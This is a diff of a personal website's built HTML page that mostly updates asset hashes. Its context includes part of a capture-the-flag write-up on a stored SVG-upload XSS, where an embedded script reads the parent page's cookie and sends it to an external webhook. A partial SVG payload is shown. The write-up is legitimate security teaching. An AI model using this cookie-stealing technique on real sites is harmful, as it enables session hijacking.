@@ -5,18 +5,18 @@
 		<link rel="icon" href="../favicon.svg" />
 		<meta name="viewport" content="width=device-width" />
 		
-		<link href="../_app/immutable/assets/0.d7acab43.css" rel="stylesheet">
+		<link href="../_app/immutable/assets/0.effcde71.css" rel="stylesheet">
 		<link href="../_app/immutable/assets/4.d85a2449.css" rel="stylesheet">
-		<link rel="modulepreload" href="../_app/immutable/entry/start.7bac7463.js">
+		<link rel="modulepreload" href="../_app/immutable/entry/start.eac07bf6.js">
 		<link rel="modulepreload" href="../_app/immutable/chunks/scheduler.2e947722.js">
-		<link rel="modulepreload" href="../_app/immutable/chunks/singletons.dca1d92c.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/singletons.eaa07d85.js">
 		<link rel="modulepreload" href="../_app/immutable/chunks/control.f5b05b5f.js">
-		<link rel="modulepreload" href="../_app/immutable/entry/app.e81514bc.js">
+		<link rel="modulepreload" href="../_app/immutable/entry/app.0f271a15.js">
 		<link rel="modulepreload" href="../_app/immutable/chunks/index.d36feded.js">
-		<link rel="modulepreload" href="../_app/immutable/nodes/0.95a51f36.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/0.b91afccf.js">
 		<link rel="modulepreload" href="../_app/immutable/chunks/each.d479417d.js">
-		<link rel="modulepreload" href="../_app/immutable/chunks/stores.a55269a7.js">
-		<link rel="modulepreload" href="../_app/immutable/nodes/4.b8c3407d.js"><title>Vishaal Ram</title><!-- HEAD_svelte-1fh2w46_START --><meta name="description" content="Vishaal Ram's personal website!"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.1.1/css/all.min.css" integrity="sha512-ioRJH7yXnyX+7fXTQEKPULWkMn3CqMcapK0NNtCN8q//sW7ZeVFcbMJ9RvX99TwDg6P8rAH2IqUSt2TLab4Xmw==" crossorigin="anonymous" referrerpolicy="no-referrer"><!-- HEAD_svelte-1fh2w46_END -->
+		<link rel="modulepreload" href="../_app/immutable/chunks/stores.594fb804.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/4.35efe7a1.js"><title>Vishaal Ram</title><!-- HEAD_svelte-1fh2w46_START --><meta name="description" content="Vishaal Ram's personal website!"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.1.1/css/all.min.css" integrity="sha512-ioRJH7yXnyX+7fXTQEKPULWkMn3CqMcapK0NNtCN8q//sW7ZeVFcbMJ9RvX99TwDg6P8rAH2IqUSt2TLab4Xmw==" crossorigin="anonymous" referrerpolicy="no-referrer"><!-- HEAD_svelte-1fh2w46_END -->
 	</head>
 	<body data-sveltekit-preload-data="hover">
 		<div style="display: contents">   <header class="layout-md mb-10" data-sveltekit-noscroll><a href="/" class="text-4xl font-overfont group">hi, i&#39;m vishy <span class="inline-block" style="transform: rotate(5deg); transition: transform 1.2s ease-in-out">🐧</span></a> <div class="flex justify-between items-start my-4"><nav class="flex text-neutral-500 justify-end space-x-6 text-lg py-0.5"><a href="/projects" class="hover:text-black transition-colors font-overfont">projects 🌳 </a><a href="/classes" class="hover:text-black transition-colors font-overfont">classes 📚 </a><a href="/blog" class="hover:text-black transition-colors font-overfont">blog ✏️ </a></nav> <div class="flex items-start text-neutral-500 space-x-4 sm:hidden"><a href="mailto:vishr@mit.edu" target="_blank"><i class="fa fa-envelope text-neutral-500 hover:text-black transition-colors hover:cursor-pointer"></i> </a><a href="https://github.com/vishaalram02" target="_blank"><i class="fab fa-github text-neutral-500 hover:text-black transition-colors hover:cursor-pointer"></i> </a><a href="https://www.goodreads.com/user/show/135129343-vishaal-ram" target="_blank"><i class="fa fa-book text-neutral-500 hover:text-black transition-colors hover:cursor-pointer"></i> </a><a href="https://open.spotify.com/user/b1xck719vtjwh2saj01gxftku" target="_blank"><i class="fab fa-spotify text-neutral-500 hover:text-black transition-colors hover:cursor-pointer"></i> </a><a href="https://www.strava.com/athletes/107723971" target="_blank"><i class="fab fa-strava text-neutral-500 hover:text-black transition-colors hover:cursor-pointer"></i> </a></div></div></header> <main><section class="layout-md"><p class="prose prose-img:rounded-xl"><!-- HTML_TAG_START --><div style="text-align: center">
@@ -181,7 +181,7 @@ chars = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map<
 
 <p>In this puzzle, we have a little cake ordering interface with some text inputs and an image input where we can upload a design. Upon submitting the input fields and design get sent to another client. Based on the prompt, we can assume the goal is to find a reflected XSS vulnerability. This would allow us to run arbitrary javascript on Vishy&#39;s browser.</p>
 <p>The trick here is to examine the image input more closely. Although the client only accepts png uploads, testing the upload endpoint reveals that the server accepts any image mimetype, including pngs, jpgs, gifs, and most importantly, svgs. Since svgs are an XML-based file format, we can embed script tags to insert our own javascript. However, the reason why the javascript will actually execute on the page is that they are rendered in a data URL with object tags. Therefore, the raw XML will be embedded in the page, causing the script to execute. </p>
-<p>Crafting our svg, we obtain the cookie from the main document with <code>window.parent.document.cookie</code> and then send the cookie to an external webhook. Once Vishy visits the page, the cookie data, containing the flag, is sent to our webhook.</p>
+<p>Crafting our svg, we obtain the cookie from the main document with <code>window.parent.document.cookie</code> and then send the cookie to an external webhook. Once Vishy visits the page, the cookie data containing the flag is sent to our webhook.</p>
 <pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns:svg</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;0.00000000&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;0.00000000&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;500.00000&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500.00000&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;svg2&quot;</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript">
     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">parent</span>.<span class="hljs-property">document</span>.<span class="hljs-property">cookie</span>);
@@ -202,7 +202,7 @@ chars = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map<
 			
 			<script>
 				{
-					__sveltekit_1vjgyoq = {
+					__sveltekit_1456u71 = {
 						base: new URL("..", location).pathname.slice(0, -1),
 						env: {}
 					};
@@ -212,8 +212,8 @@ chars = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map<
 					const data = [null,null];
 
 					Promise.all([
-						import("../_app/immutable/entry/start.7bac7463.js"),
-						import("../_app/immutable/entry/app.e81514bc.js")
+						import("../_app/immutable/entry/start.eac07bf6.js"),
+						import("../_app/immutable/entry/app.0f271a15.js")
 					]).then(([kit, app]) => {
 						kit.start(app, element, {
 							node_ids: [0, 4],
